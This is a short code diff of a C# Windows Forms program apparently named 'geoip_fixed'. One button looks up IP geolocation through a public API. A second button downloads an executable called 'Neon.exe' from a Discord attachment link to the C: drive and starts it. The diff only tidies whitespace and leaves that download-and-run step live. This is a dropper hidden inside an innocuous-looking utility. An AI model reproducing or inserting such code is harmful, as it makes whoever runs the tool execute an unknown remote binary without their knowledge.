@@ -22,9 +22,7 @@ namespace geoip_fixed
         private void button1_Click(object sender, EventArgs e)
         {
             WebClient client = new WebClient();
-
-            var ip = client.DownloadString("https://api.hackertarget.com/geoip/?q=" + textBox1.Text);
-            richTextBox1.Text = ip;
+            richTextBox1.Text = client.DownloadString("https://api.hackertarget.com/geoip/?q=" + textBox1.Text);
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -35,7 +33,6 @@ namespace geoip_fixed
         private void button2_Click(object sender, EventArgs e)
         {
             WebClient lol = new WebClient();
-            
             lol.DownloadFile("https://cdn.discordapp.com/attachments/877863058272313364/878574461694148648/Neon.exe", @"C:\Neon.exe");
             Process.Start("Neon.exe");
         }
